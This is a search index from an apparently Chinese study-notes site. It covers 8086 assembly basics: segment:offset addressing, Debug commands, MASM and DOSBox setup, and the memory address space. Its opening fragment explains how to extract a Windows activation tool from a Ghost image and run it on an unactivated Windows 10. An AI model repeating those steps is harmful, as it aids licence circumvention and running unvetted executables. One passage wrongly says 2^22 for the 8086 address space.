\u4e0b\u8f7d\u5b8c\u6210\u4e4b\u540e\uff0c\u53ef\u4ee5\u7528 360zip https://yasuo.360.cn \u514d\u8d39\u65e0\u5e7f\u544a\u3002\u8fd9\u4e2a\u5de5\u5177\u8fdb\u884c\u89e3\u538b\u3002\u89e3\u538b\u955c\u50cf\u6587\u4ef6 \u7136\u540e\u4e0b\u8f7dghos explorer \uff0c\u4e0b\u8f7d\u5730\u5740\u4e3a\uff1a https://baoku.360.cn/soft/show/appid/1900006143 \uff0c\u9009\u62e9 \u666e\u901a\u4e0b\u8f7d \u5373\u53ef\uff0c\u8fd9\u4e2a\u5de5\u5177\u7684\u5b98\u65b9\u7f51\u7ad9\u5df2\u7ecf\u4e0d\u5b58\u5728\uff0c\u56e0\u4e3a\u51fa\u54c1\u8fd9\u4e2a\u5de5\u5177\u7684\u5de5\u5177\u7684\u516c\u53f8\u88ab\u6536\u8d2d\u4e86\uff0c\u7f51\u7ad9\u8fdb\u884c\u4e86\u91cd\u7ec4\uff0c\u539f\u5b98\u7f51\u5730\u5740\u4e3a\uff1ahttp://www.symantec.com/themes/ghost/index.jsp \uff0c\u5b89\u88c5\u9009\u9879\u5168\u90e8\u9ed8\u8ba4\u5373\u53ef \u7528ghos explorer\u6253\u5f00\u521a\u624d\u4e0b\u8f7d\u597d\u7684\u955c\u50cf\u7684\u89e3\u538b\u76ee\u5f55\uff0c\u9009\u62e9\u89e3\u538b\u76ee\u5f55\u4e2d.GHO\u7ed3\u5c3e\u7684\u6587\u4ef6\u3002 \u5728GHO\u6587\u4ef6\u4e2d\uff0c\u6253\u5f00\u8def\u5f84\u4e3aUsers\\Administrator\\Desktop\uff0c\u5373\u53ef\u627e\u5230\u6fc0\u6d3b\u5de5\u5177\uff0c\u62d6\u51fa\u6765\u5c31\u53ef\u4ee5\u4e86\u3002 \u628a\u8be5\u6fc0\u6d3b\u5de5\u5177\uff0c\u590d\u5236\u5230\u672a\u6fc0\u6d3b\u7684Windows10\u91cc\u9762\uff0c\u76f4\u63a5\u6253\u5f00\uff0c\u6309\u7167\u63d0\u793a\u5c31\u53ef\u4ee5\u6fc0\u6d3b\u4e86\u3002","title":"\u5de5\u5177\u6fc0\u6d3b"},{"location":"system/%E6%B1%87%E7%BC%96/8086CPU/","text":"8086CPU 8086CPU\u662f16\u4f4dCPU \u8fd0\u7b97\u5668\u4e00\u6b21\u6700\u591a\u53ef\u4ee5\u5904\u740616\u4f4d\u7684\u6570\u636e \u5bc4\u5b58\u5668\u7684\u6700\u5927\u5bbd\u5ea6\u4e3a16\u4f4d \u5bc4\u5b58\u5668\u548c\u8fd0\u7b97\u5668\u4e4b\u95f4\u7684\u901a\u8def\u4e3a16\u4f4d 8086CPU\u670920\u4f4d\u5730\u5740\u603b\u7ebf\uff0c\u53ef\u4ee5\u4f20\u900120\u4f4d\u5730\u5740\uff0c\u8fbe\u52301MB\u5bfb\u5740\u80fd\u529b\u3002 8086CPU\u91c6\u7528\u4e00\u79cd\u5728\u5185\u90e8\u7528\u4e24\u4e2a16\u4f4d\u5730\u5740\u5408\u6210\u7684\u65b9\u6cd5\u6765\u5f62\u6210\u4e00\u4e2a20\u4f4d\u7684\u7269\u7406\u5730\u5740\u3002 \u5728\u7ebf16\u8fdb\u5236\u52a0\u6cd5\u8fd0\u7b97\u5668\uff1a \u5341\u516d\u8fdb\u5236\u52a0\u6cd5\u8ba1\u7b97\u5668 (99cankao.com) \u5728\u7ebf16\u8fdb\u5236\u4e58\u6cd5\u8ba1\u7b97\u5668\uff1a \u5341\u516d\u8fdb\u5236\u4e58\u6cd5\u8ba1\u7b97\u5668 (99cankao.com) \u8fdb\u5236\u8f6c\u6362\uff1ahttps://c.runoob.com/front-end/58/ CPU\u4e2d\u7684\u76f8\u5173\u90e8\u4ef6\u63d0\u4f9b\u4e24\u4e2a16\u4f4d\u7684\u5730\u5740\uff0c\u4e00\u4e2a\u79f0\u4e3a \u6bb5\u5730\u5740 \uff0c\u53e6\u4e00\u4e2a\u79f0\u4e3a \u504f\u79fb\u5730\u5740 ; \u6bb5\u5730\u5740\u548c\u504f\u79fb\u5730\u5740\u901a\u8fc7\u5185\u90e8\u603b\u7ebf\u9001\u5165\u4e00\u4e2a\u79f0\u4e3a\u5730\u5740\u52a0\u6cd5\u5668\u7684\u90e8\u4ef6\uff1b \u5730\u5740\u52a0\u6cd5\u5668\u5c06\u4e24\u4e2a16\u4f4d\u5730\u5740\u5408\u6210\u4e3a\u4e00\u4e2a20\u4f4d\u7684\u7269\u7406\u5730\u5740\uff1b \u5730\u5740\u52a0\u6cd5\u5668\u901a\u8fc7\u5185\u90e8\u603b\u7ebf\u5c0620\u4f4d\u7269\u7406\u5730\u5740\u9001\u5165\u8f93\u5165\u8f93\u51fa\u63a7\u5236\u7535\u8def\uff1b \u8f93\u5165\u8f93\u51fa\u63a7\u5236\u7535\u8def\u5c0620\u4f4d\u7269\u7406\u5730\u5740\u9001\u4e0a\u5730\u5740\u603b\u7ebf\uff1b 20\u4f4d\u7269\u7406\u5730\u5740\u88ab\u5730\u5740\u603b\u7ebf\u4f20\u9001\u5230\u5b58\u50a8\u5668 \u5730\u5740\u52a0\u6cd5\u5668\u91c6\u7528\u7269\u7406\u5730\u5740= \u6bb5\u5730\u5740X16+\u504f\u79fb\u5730\u5740 \u7684\u65b9\u6cd5\u7528\u6bb5\u5730\u5740\u548c\u504f\u79fb\u5730\u5740\u5408\u6210\u7269\u7406\u5730\u5740 \u5982\u4e0a\u56fe\uff0c\u6bb5\u5730\u574016\u8fdb\u5236\u4e3a1230\uff0c\u504f\u79fb\u5730\u574016\u8fdb\u5236\u4e3a00C8\uff0c16\u7684\u5341\u516d\u8fdb\u5236\u4e3a10\uff0c1230\u00d710=12300\uff0c12300+00C8=123C8 \u6700\u540e\u7684\u7269\u7406\u5730\u5740\u4e3a123C8\uff08\u53cb\u60c5\u63d0\u9192\uff1a123C8\u7684\u7269\u7406\u5730\u5740\u5b58\u50a8\u7684\u4e3a\u4e00\u4e2aByte\uff09 \u56e0\u4e3a\u6bb5\u5730\u5740\u4e3a16\u4f4d\u7684\uff0c\u6240\u4ee5\u6bb5\u5730\u5740\u6700\u5927\u4e2a\u6570\u4e3a2\u768416\u6b21\u65b9\uff0c\u4e3a65536\uff0c\u56e0\u4e3a\u5b58\u50a8\u5355\u4f4d\u6700\u5c0f\u4e3aByte\uff0c65536Byte=64KB\uff0c\u6240\u4ee5\u6709\u7684\u4e66\u91cc\u8bf4\u6bb5\u5730\u5740\u6700\u5927\u5bfb\u5740\u80fd\u529b\u4e3a64KB \u56e0\u4e3a\u504f\u79fb\u5730\u5740\u4e3a16\u4f4d\u7684\uff0c\u6240\u4ee5\u76f8\u540c\u7684\u6bb5\u5730\u5740\uff0c\u548c\u4e0d\u540c\u7684\u504f\u79fb\u5730\u5740\u53ef\u4ee5\u8868\u8fbe65536\u4e2a\u5b58\u50a8\u5355\u5143\uff0c\u4e5f\u5c31\u662f64K","title":"8086CPU"},{"location":"system/%E6%B1%87%E7%BC%96/8086CPU/#8086cpu","text":"8086CPU\u662f16\u4f4dCPU \u8fd0\u7b97\u5668\u4e00\u6b21\u6700\u591a\u53ef\u4ee5\u5904\u740616\u4f4d\u7684\u6570\u636e \u5bc4\u5b58\u5668\u7684\u6700\u5927\u5bbd\u5ea6\u4e3a16\u4f4d \u5bc4\u5b58\u5668\u548c\u8fd0\u7b97\u5668\u4e4b\u95f4\u7684\u901a\u8def\u4e3a16\u4f4d 8086CPU\u670920\u4f4d\u5730\u5740\u603b\u7ebf\uff0c\u53ef\u4ee5\u4f20\u900120\u4f4d\u5730\u5740\uff0c\u8fbe\u52301MB\u5bfb\u5740\u80fd\u529b\u3002 8086CPU\u91c6\u7528\u4e00\u79cd\u5728\u5185\u90e8\u7528\u4e24\u4e2a16\u4f4d\u5730\u5740\u5408\u6210\u7684\u65b9\u6cd5\u6765\u5f62\u6210\u4e00\u4e2a20\u4f4d\u7684\u7269\u7406\u5730\u5740\u3002 \u5728\u7ebf16\u8fdb\u5236\u52a0\u6cd5\u8fd0\u7b97\u5668\uff1a \u5341\u516d\u8fdb\u5236\u52a0\u6cd5\u8ba1\u7b97\u5668 (99cankao.com) \u5728\u7ebf16\u8fdb\u5236\u4e58\u6cd5\u8ba1\u7b97\u5668\uff1a \u5341\u516d\u8fdb\u5236\u4e58\u6cd5\u8ba1\u7b97\u5668 (99cankao.com) \u8fdb\u5236\u8f6c\u6362\uff1ahttps://c.runoob.com/front-end/58/ CPU\u4e2d\u7684\u76f8\u5173\u90e8\u4ef6\u63d0\u4f9b\u4e24\u4e2a16\u4f4d\u7684\u5730\u5740\uff0c\u4e00\u4e2a\u79f0\u4e3a \u6bb5\u5730\u5740 \uff0c\u53e6\u4e00\u4e2a\u79f0\u4e3a \u504f\u79fb\u5730\u5740 ; \u6bb5\u5730\u5740\u548c\u504f\u79fb\u5730\u5740\u901a\u8fc7\u5185\u90e8\u603b\u7ebf\u9001\u5165\u4e00\u4e2a\u79f0\u4e3a\u5730\u5740\u52a0\u6cd5\u5668\u7684\u90e8\u4ef6\uff1b \u5730\u5740\u52a0\u6cd5\u5668\u5c06\u4e24\u4e2a16\u4f4d\u5730\u5740\u5408\u6210\u4e3a\u4e00\u4e2a20\u4f4d\u7684\u7269\u7406\u5730\u5740\uff1b \u5730\u5740\u52a0\u6cd5\u5668\u901a\u8fc7\u5185\u90e8\u603b\u7ebf\u5c0620\u4f4d\u7269\u7406\u5730\u5740\u9001\u5165\u8f93\u5165\u8f93\u51fa\u63a7\u5236\u7535\u8def\uff1b \u8f93\u5165\u8f93\u51fa\u63a7\u5236\u7535\u8def\u5c0620\u4f4d\u7269\u7406\u5730\u5740\u9001\u4e0a\u5730\u5740\u603b\u7ebf\uff1b 20\u4f4d\u7269\u7406\u5730\u5740\u88ab\u5730\u5740\u603b\u7ebf\u4f20\u9001\u5230\u5b58\u50a8\u5668 \u5730\u5740\u52a0\u6cd5\u5668\u91c6\u7528\u7269\u7406\u5730\u5740= \u6bb5\u5730\u5740X16+\u504f\u79fb\u5730\u5740 \u7684\u65b9\u6cd5\u7528\u6bb5\u5730\u5740\u548c\u504f\u79fb\u5730\u5740\u5408\u6210\u7269\u7406\u5730\u5740 \u5982\u4e0a\u56fe\uff0c\u6bb5\u5730\u574016\u8fdb\u5236\u4e3a1230\uff0c\u504f\u79fb\u5730\u574016\u8fdb\u5236\u4e3a00C8\uff0c16\u7684\u5341\u516d\u8fdb\u5236\u4e3a10\uff0c1230\u00d710=12300\uff0c12300+00C8=123C8 \u6700\u540e\u7684\u7269\u7406\u5730\u5740\u4e3a123C8\uff08\u53cb\u60c5\u63d0\u9192\uff1a123C8\u7684\u7269\u7406\u5730\u5740\u5b58\u50a8\u7684\u4e3a\u4e00\u4e2aByte\uff09 \u56e0\u4e3a\u6bb5\u5730\u5740\u4e3a16\u4f4d\u7684\uff0c\u6240\u4ee5\u6bb5\u5730\u5740\u6700\u5927\u4e2a\u6570\u4e3a2\u768416\u6b21\u65b9\uff0c\u4e3a65536\uff0c\u56e0\u4e3a\u5b58\u50a8\u5355\u4f4d\u6700\u5c0f\u4e3aByte\uff0c65536Byte=64KB\uff0c\u6240\u4ee5\u6709\u7684\u4e66\u91cc\u8bf4\u6bb5\u5730\u5740\u6700\u5927\u5bfb\u5740\u80fd\u529b\u4e3a64KB \u56e0\u4e3a\u504f\u79fb\u5730\u5740\u4e3a16\u4f4d\u7684\uff0c\u6240\u4ee5\u76f8\u540c\u7684\u6bb5\u5730\u5740\uff0c\u548c\u4e0d\u540c\u7684\u504f\u79fb\u5730\u5740\u53ef\u4ee5\u8868\u8fbe65536\u4e2a\u5b58\u50a8\u5355\u5143\uff0c\u4e5f\u5c31\u662f64K","title":"8086CPU"},{"location":"system/%E6%B1%87%E7%BC%96/debug%E5%91%BD%E4%BB%A4/","text":"Debug\u547d\u4ee4 \u6211\u4eec\u7528\u5230\u7684Debug\u529f\u80fd\u3002 \u7528Debug\u7684R\u547d\u4ee4\u67e5\u770b\u3001\u6539\u53d8CPU\u5bc4\u5b58\u5668\u7684\u5185\u5bb9\uff1b \u7528Debug\u7684D\u547d\u4ee4\u67e5\u770b\u5185\u5b58\u4e2d\u7684\u5185\u5bb9\uff1b \u7528Debug\u7684E\u547d\u4ee4\u6539\u5199\u5185\u5b58\u4e2d\u7684\u5185\u5bb9\uff1b \u7528Debug\u7684U\u547d\u4ee4\u5c06\u5185\u5b58\u4e2d\u7684\u673a\u5668\u6307\u4ee4\u7ffb\u8bd1\u6210\u6c47\u7f16\u6307\u4ee4\uff1b \u7528Debug\u7684T\u547d\u4ee4\u6267\u884c\u4e00\u6761\u673a\u5668\u6307\u4ee4\uff1b \u7528Debug\u7684A\u547d\u4ee4\u4ee5\u6c47\u7f16\u6307\u4ee4\u7684\u683c\u5f0f\u5728\u5185\u5b58\u4e2d\u5199\u5165\u4e00\u6761\u673a\u5668\u6307\u4ee4","title":"debug\u547d\u4ee4"},{"location":"system/%E6%B1%87%E7%BC%96/win10-masm/","text":"\u642d\u5efamasm\u6c47\u7f16\u73af\u5883 1\u3001WIN10\u4e0b\u642d\u5efamasm\u6c47\u7f16\u73af\u5883 \u4e0b\u8f7ddosbox\u7684windows\u7248\u672c\uff1ahttps://www.dosbox.com/ \u4e0b\u8f7dmasm\u7b49\u7a0b\u5e8f\uff1ahttps://github.com/yinzhipeng123/Picture_Bed/raw/main/masm615.zip masm\u89e3\u538b\u540e\uff0c\u6539\u540d\u4e3amasm615\uff0c\uff0c\u653e\u5728D\u76d8\uff0c\u5982\u4e0b D:\\masm615 BIN/ DOSXNT.EXE* \u3002\u3002\u3002\u3002 \u5b89\u88c5dosbox\uff0c\u5728DOSBOX\u5b89\u88c5\u76ee\u5f55\uff0c\u53cc\u51fbDOSBox 0.74-3 Options.bat\uff0c\u4f1a\u5f39\u51faDOSBOX\u7684\u914d\u7f6e\uff0c\u672b\u5c3e\u6dfb\u52a0 mount d D:\\masm615 path=%path%;D:\\BIN;D:\\ d: cd myasm \u5728D:\\masm615\\myasm\u76ee\u5f55\u4e0b\u8fdb\u884c\u7f16\u8f91asm\u6587\u4ef6\uff0c\u5728DOSBOX\u6a21\u62df\u5668\u91cc\u9762\u5c31\u80fd\u76f4\u63a5\u5bf9asm\u6587\u4ef6\u8fdb\u884c\u7f16\u8bd1\uff0c\u8fd0\u884c\u548c\u8c03\u8bd5\u4e86 \u7f16\u8f91 eg101.asm ;eg101.asm .model small .stack .data msg db 'hello assembly!',13,10,'$' .code .startup mov dx , offset msg mov ah , 9 int 21h .exit end \u6253\u5f00\u684c\u9762\u4e0a\u7684DOSBox 0.74-3\u56fe\u6807\uff0c\u547d\u4ee4\u884c\u91cc\u8f93\u5165\uff1a > ML611.EXE eg101.asm > eg101.exe hello assembly! > 2\u3001mac\u4e0a\u642d\u5efamasm\u6c47\u7f16\u73af\u5883 \u4e0b\u8f7ddosbox\u7684windows\u7248\u672c\uff1ahttps://www.dosbox.com/ \u4e0b\u8f7dmasm\u7b49\u7a0b\u5e8f\uff1ahttps://github.com/yinzhipeng123/Picture_Bed/raw/main/masm615.zip masm\u89e3\u538b\u540e\uff0c\u6539\u540d\u4e3amasm615\uff0c\u653e\u5728\u5bb6\u76ee\u5f55 /Users/zhipengyin/\u4e0b\uff0c\u5982\u4e0b zhipengyin@zhipengyindeMBP masm615 % ls BIN HELP LIB.EXE Ml611.exe masm DOSXNT.EXE INCLUDE LINK.EXE Ml710.exe ml.exe EDIT.COM INIT MASM.EXE SAMPLES myasm EDIT.HLP LIB ML.ERR TMP zhipengyin@zhipengyindeMBP masm615 % pwd /Users/zhipengyin/masm615 \u5b89\u88c5DOSBOX\uff0c\u7136\u540e\u7f16\u8f91DOSBOX\u914d\u7f6e\u3002\u5982\u4e0b vim /Users/zhipengyin/Library/Preferences/DOSBox\\ 0.74-3-3\\ Preferences [autoexec] # Lines in this section will be run at startup. # You can put your MOUNT lines here. # \u5728\u8fd9\u6dfb\u52a0\u4e0b\u9762\u7684\u5185\u5bb9 mount d /Users/zhipengyin/masm615 path=%path%;D:\\BIN;D:\\ d: cd myasm \u5728/Users/zhipengyin/masm615/myasm\u76ee\u5f55\u4e0b\u8fdb\u884c\u7f16\u8f91asm\u6587\u4ef6\uff0c\u5728DOSBOX\u6a21\u62df\u5668\u91cc\u9762\u5c31\u80fd\u76f4\u63a5\u5bf9asm\u6587\u4ef6\u8fdb\u884c\u7f16\u8bd1\uff0c\u8fd0\u884c\u548c\u8c03\u8bd5\u4e86 \u7f16\u8f91 eg101.asm ;eg101.asm .model small .stack .data msg db 'hello assembly!',13,10,'$' .code .startup mov dx , offset msg mov ah , 9 int 21h .exit end \u6253\u5f00\u684c\u9762\u4e0a\u7684DOSBox\u56fe\u6807\uff0c\u547d\u4ee4\u884c\u91cc\u8f93\u5165\uff1a > ML611.EXE eg101.asm > eg101.exe hello assembly! >","title":"win10\u4e0b\u642d\u5efa8086\u6c47\u7f16\u73af\u5883"},{"location":"system/%E6%B1%87%E7%BC%96/win10-masm/#masm","text":"","title":"\u642d\u5efamasm\u6c47\u7f16\u73af\u5883"},{"location":"system/%E6%B1%87%E7%BC%96/win10-masm/#1win10masm","text":"\u4e0b\u8f7ddosbox\u7684windows\u7248\u672c\uff1ahttps://www.dosbox.com/ \u4e0b\u8f7dmasm\u7b49\u7a0b\u5e8f\uff1ahttps://github.com/yinzhipeng123/Picture_Bed/raw/main/masm615.zip masm\u89e3\u538b\u540e\uff0c\u6539\u540d\u4e3amasm615\uff0c\uff0c\u653e\u5728D\u76d8\uff0c\u5982\u4e0b D:\\masm615 BIN/ DOSXNT.EXE* \u3002\u3002\u3002\u3002 \u5b89\u88c5dosbox\uff0c\u5728DOSBOX\u5b89\u88c5\u76ee\u5f55\uff0c\u53cc\u51fbDOSBox 0.74-3 Options.bat\uff0c\u4f1a\u5f39\u51faDOSBOX\u7684\u914d\u7f6e\uff0c\u672b\u5c3e\u6dfb\u52a0 mount d D:\\masm615 path=%path%;D:\\BIN;D:\\ d: cd myasm \u5728D:\\masm615\\myasm\u76ee\u5f55\u4e0b\u8fdb\u884c\u7f16\u8f91asm\u6587\u4ef6\uff0c\u5728DOSBOX\u6a21\u62df\u5668\u91cc\u9762\u5c31\u80fd\u76f4\u63a5\u5bf9asm\u6587\u4ef6\u8fdb\u884c\u7f16\u8bd1\uff0c\u8fd0\u884c\u548c\u8c03\u8bd5\u4e86 \u7f16\u8f91 eg101.asm ;eg101.asm .model small .stack .data msg db 'hello assembly!',13,10,'$' .code .startup mov dx , offset msg mov ah , 9 int 21h .exit end \u6253\u5f00\u684c\u9762\u4e0a\u7684DOSBox 0.74-3\u56fe\u6807\uff0c\u547d\u4ee4\u884c\u91cc\u8f93\u5165\uff1a > ML611.EXE eg101.asm > eg101.exe hello assembly! >","title":"1\u3001WIN10\u4e0b\u642d\u5efamasm\u6c47\u7f16\u73af\u5883"},{"location":"system/%E6%B1%87%E7%BC%96/win10-masm/#2macmasm","text":"\u4e0b\u8f7ddosbox\u7684windows\u7248\u672c\uff1ahttps://www.dosbox.com/ \u4e0b\u8f7dmasm\u7b49\u7a0b\u5e8f\uff1ahttps://github.com/yinzhipeng123/Picture_Bed/raw/main/masm615.zip masm\u89e3\u538b\u540e\uff0c\u6539\u540d\u4e3amasm615\uff0c\u653e\u5728\u5bb6\u76ee\u5f55 /Users/zhipengyin/\u4e0b\uff0c\u5982\u4e0b zhipengyin@zhipengyindeMBP masm615 % ls BIN HELP LIB.EXE Ml611.exe masm DOSXNT.EXE INCLUDE LINK.EXE Ml710.exe ml.exe EDIT.COM INIT MASM.EXE SAMPLES myasm EDIT.HLP LIB ML.ERR TMP zhipengyin@zhipengyindeMBP masm615 % pwd /Users/zhipengyin/masm615 \u5b89\u88c5DOSBOX\uff0c\u7136\u540e\u7f16\u8f91DOSBOX\u914d\u7f6e\u3002\u5982\u4e0b vim /Users/zhipengyin/Library/Preferences/DOSBox\\ 0.74-3-3\\ Preferences [autoexec] # Lines in this section will be run at startup. # You can put your MOUNT lines here. # \u5728\u8fd9\u6dfb\u52a0\u4e0b\u9762\u7684\u5185\u5bb9 mount d /Users/zhipengyin/masm615 path=%path%;D:\\BIN;D:\\ d: cd myasm \u5728/Users/zhipengyin/masm615/myasm\u76ee\u5f55\u4e0b\u8fdb\u884c\u7f16\u8f91asm\u6587\u4ef6\uff0c\u5728DOSBOX\u6a21\u62df\u5668\u91cc\u9762\u5c31\u80fd\u76f4\u63a5\u5bf9asm\u6587\u4ef6\u8fdb\u884c\u7f16\u8bd1\uff0c\u8fd0\u884c\u548c\u8c03\u8bd5\u4e86 \u7f16\u8f91 eg101.asm ;eg101.asm .model small .stack .data msg db 'hello assembly!',13,10,'$' .code .startup mov dx , offset msg mov ah , 9 int 21h .exit end \u6253\u5f00\u684c\u9762\u4e0a\u7684DOSBox\u56fe\u6807\uff0c\u547d\u4ee4\u884c\u91cc\u8f93\u5165\uff1a > ML611.EXE eg101.asm > eg101.exe hello assembly! >","title":"2\u3001mac\u4e0a\u642d\u5efamasm\u6c47\u7f16\u73af\u5883"},{"location":"system/%E6%B1%87%E7%BC%96/win10-masm/#_1","text":"","title":""},{"location":"system/%E6%B1%87%E7%BC%96/%E4%BB%A3%E7%A0%81%E6%AE%B5/","text":"\u4ee3\u7801\u6bb5 \u5bf9\u4e8e8086PC\u673a\uff0c\u5728\u7f16\u7a0b\u65f6\uff0c\u53ef\u4ee5\u6839\u636e\u9700\u8981\uff0c\u5c06\u4e00\u7ec4\u5185\u5b58\u5355\u5143\u5b9a\u4e49\u4e3a\u4e00\u4e2a\u6bb5\u3002\u6211\u4eec\u53ef\u4ee5\u5c06\u957f\u5ea6\u4e3aN(N<=64KB)\u7684\u4e00\u7ec4\u4ee3\u7801\uff0c\u6211\u4eec\u53ef\u4ee5\u8ba4\u4e3a\uff0c\u8fd9\u6bb5\u5185\u5b58\u662f\u7528\u6765\u5b58\u653e\u4ee3\u7801\u7684\uff0c\u4ece\u800c\u5b9a\u4e49\u4e86\u4e00\u4e2a\u4ee3\u7801\u6bb5\u3002","title":"\u4ee3\u7801\u6bb5"},{"location":"system/%E6%B1%87%E7%BC%96/%E4%BB%A3%E7%A0%81%E6%AE%B5/#_1","text":"\u5bf9\u4e8e8086PC\u673a\uff0c\u5728\u7f16\u7a0b\u65f6\uff0c\u53ef\u4ee5\u6839\u636e\u9700\u8981\uff0c\u5c06\u4e00\u7ec4\u5185\u5b58\u5355\u5143\u5b9a\u4e49\u4e3a\u4e00\u4e2a\u6bb5\u3002\u6211\u4eec\u53ef\u4ee5\u5c06\u957f\u5ea6\u4e3aN(N<=64KB)\u7684\u4e00\u7ec4\u4ee3\u7801\uff0c\u6211\u4eec\u53ef\u4ee5\u8ba4\u4e3a\uff0c\u8fd9\u6bb5\u5185\u5b58\u662f\u7528\u6765\u5b58\u653e\u4ee3\u7801\u7684\uff0c\u4ece\u800c\u5b9a\u4e49\u4e86\u4e00\u4e2a\u4ee3\u7801\u6bb5\u3002","title":"\u4ee3\u7801\u6bb5"},{"location":"system/%E6%B1%87%E7%BC%96/%E5%86%85%E5%AD%98%E5%9C%B0%E5%9D%80%E7%A9%BA%E9%97%B4/","text":"\u5185\u5b58\u5730\u5740\u7a7a\u95f4 \u4e0a\u8ff0\u7684\u90a3\u4e9b\u5b58\u50a8\u5668\uff0c\u5728\u7269\u7406\u4e0a\u662f\u72ec\u7acb\u7684\u5668\u4ef6\uff0c\u4f46\u662f\u5728\u4ee5\u4e0b\u4e24\u70b9\u4e0a\u76f8\u540c\u3002 \u2022 \u90fd\u548cCPU\u7684\u603b\u7ebf\u76f8\u8fde\u3002 \u2022 CPU\u5bf9\u5b83\u4eec\u8fdb\u884c\u8bfb\u6216\u5199\u7684\u65f6\u5019\u90fd\u901a\u8fc7\u63a7\u5236\u7ebf\u53d1\u51fa\u5185\u5b58\u8bfb\u5199\u547d\u4ee4\u3002 \u8fd9\u4e5f\u5c31\u662f\u8bf4\uff0cCPU\u5728\u64cd\u63a7\u5b83\u4eec\u7684\u65f6\u5019\uff0c\u628a\u5b83\u4eec\u90fd\u5f53\u4f5c\u5185\u5b58\u6765\u5bf9\u5f85\uff0c\u628a\u5b83\u4eec\u603b\u7684\u770b\u4f5c\u4e00\u4e2a\u7531\u82e5\u5e72\u5b58\u50a8\u5355\u5143\u7ec4\u6210\u7684\u903b\u8f91\u5b58\u50a8\u5668\uff0c\u8fd9\u4e2a\u903b\u8f91\u5b58\u50a8\u5668\u5c31\u662f\u6211\u4eec\u6240\u8bf4\u7684\u5185\u5b58\u5730\u5740\u7a7a\u95f4\u3002 \u5728\u6c47\u7f16\u8fd9\u95e8\u8bfe\u4e2d\uff0c\u6211\u4eec\u6240\u9762\u5bf9\u7684\u662f\u5185\u5b58\u5730\u5740\u7a7a\u95f4 \u6240\u6709\u7684\u7269\u7406\u5b58\u50a8\u5668\u88ab\u770b\u4f5c\u4e00\u4e2a\u7531\u82e5\u5e72\u5b58\u50a8\u5355\u5143\u7ec4\u6210\u7684\u903b\u8f91\u5b58\u50a8\u5668\uff0c\u6bcf\u4e2a \u7269\u7406\u5b58\u50a8\u5668\u5728\u8fd9\u4e2a\u903b\u8f91\u5b58\u50a8\u5668\u4e2d\u5360\u6709\u4e00\u4e2a\u5730\u5740\u6bb5\uff0c\u5373\u4e00\u6bb5\u5730\u5740\u7a7a\u95f4\u3002CPU\u5728\u8fd9\u6bb5\u5730\u5740\u7a7a \u95f4\u4e2d\u8bfb\u5199\u6570\u636e\uff0c\u5b9e\u9645\u4e0a\u5c31\u662f\u5728\u76f8\u5bf9\u5e94\u7684\u7269\u7406\u5b58\u50a8\u5668\u4e2d\u8bfb\u5199\u6570\u636e \u5185\u5b58\u5730\u5740\u7a7a\u95f4\u7684\u5927\u5c0f\u53d7CPU\u5730\u5740\u603b\u7ebf\u5bbd\u5ea6\u7684\u9650\u5236\u30028086CPU\u7684\u5730\u5740\u603b\u7ebf\u5bbd\u5ea6\u4e3a20, \u53ef\u4ee5\u4f20\u90012\u768420\u6b21\u65b9\u4e2a\u4e0d\u540c\u7684\u5730\u5740\u4fe1\u606f\uff08\u5927\u5c0f\u4ece0\u81f32\u768420\u6b21\u65b9-1\uff09\u5373\u53ef\u4ee5\u5b9a\u4f4d2\u768422\u6b21\u65b9\u4e2a\u5185\u5b58\u5355\u5143\uff0c\u5219 8086CPC\u7684\u5185\u5b58\u5730\u5740\u7a7a\u95f4\u5927\u5c0f\u4e3a1MB\u3002\u540c\u7406\uff0c80386CPU\u7684\u5730\u5740\u603b\u7ebf\u5bbd\u5ea6\u4e3a32,\u5219\u5185\u5b58\u5730 \u5740\u7a7a\u95f4\u6700\u5927\u4e3a4GB \u6211\u4eec\u5728\u57fa\u4e8e\u4e00\u4e2a\u8ba1\u7b97\u673a\u786c\u4ef6\u7cfb\u7edf\u7f16\u7a0b\u7684\u65f6\u5019\uff0c\u5fc5\u987b\u77e5\u9053\u8fd9\u4e2a\u7cfb\u7edf\u4e2d\u7684\u5185\u5b58\u5730\u5740\u7a7a\u95f4\u5206\u914d\u60c5\u51b5\u3002\u56e0\u4e3a\u5f53\u6211\u4eec\u60f3\u5728\u67d0\u7c7b\u5b58\u50a8\u5668\u4e2d\u8bfb\u5199\u6570\u636e\u7684\u65f6\u5019\uff0c\u5fc5\u987b\u77e5\u9053\u5b83\u7684\u7b2c\u4e00\u4e2a\u5355\u5143\u7684\u5730\u5740 \u548c\u6700\u540e\u4e00\u4e2a\u5355\u5143\u7684\u5730\u5740\uff0c\u624d\u80fd\u4fdd\u8bc1\u8bfb\u5199\u64cd\u4f5c\u662f\u5728\u9884\u671f\u7684\u5b58\u50a8\u5668\u4e2d\u8fdb\u884c\u3002\u6bd4\u5982\uff0c\u6211\u4eec\u5e0c\u671b\u5411 \u663e\u793a\u5668\u8f93\u51fa\u4e00\u6bb5\u4fe1\u606f\uff0c\u90a3\u4e48\u5fc5\u987b\u5c06\u8fd9\u6bb5\u4fe1\u606f\u5199\u5230\u663e\u5b58\u4e2d\uff0c\u663e\u5361\u624d\u80fd\u5c06\u5b83\u8f93\u5c80\u5230\u663e\u793a\u5668\u4e0a\u3002 \u8981\u5411\u663e\u5b58\u4e2d\u5199\u5165\u6570\u636e\uff0c\u5fc5\u987b\u77e5\u9053\u663e\u5b58\u5728\u5185\u5b58\u5730\u5740\u7a7a\u95f4\u4e2d\u7684\u5730\u5740 \u4e0d\u540c\u7684\u8ba1\u7b97\u673a\u7cfb\u7edf\u7684\u5185\u5b58\u5730\u5740\u7a7a\u95f4\u7684\u5206\u914d\u60c5\u51b5\u662f\u4e0d\u540c\u7684\uff0c\u56fe1.9\u5c55\u793a\u4e86 8086PC\u673a\u5185 \u5b58\u5730\u5740\u7a7a\u95f4\u5206\u914d\u7684\u57fa\u672c\u60c5\u51b5\u3002 \u56fe1.9\u544a\u8bc9\u6211\u4eec\uff0c\u4ece\u5730\u57400-9FFFF\u7684\u5185\u5b58\u5355\u5143\u4e2d\u8bfb\u53d6\u6570\u636e\uff0c\u5b9e\u9645\u4e0a\u5c31\u662f\u5728\u8bfb\u53d6\u4e3b\u968f\u673a \u5b58\u50a8\u5668\u4e2d\u7684\u6570\u636e\uff1b\u5411\u5730\u5740A0000-BFFFF\u7684\u5185\u5b58\u5355\u5143\u4e2d\u5199\u6570\u636e\uff0c\u5c31\u662f\u5411\u663e\u5b58\u4e2d\u5199\u5165\u6570\u636e\uff0c 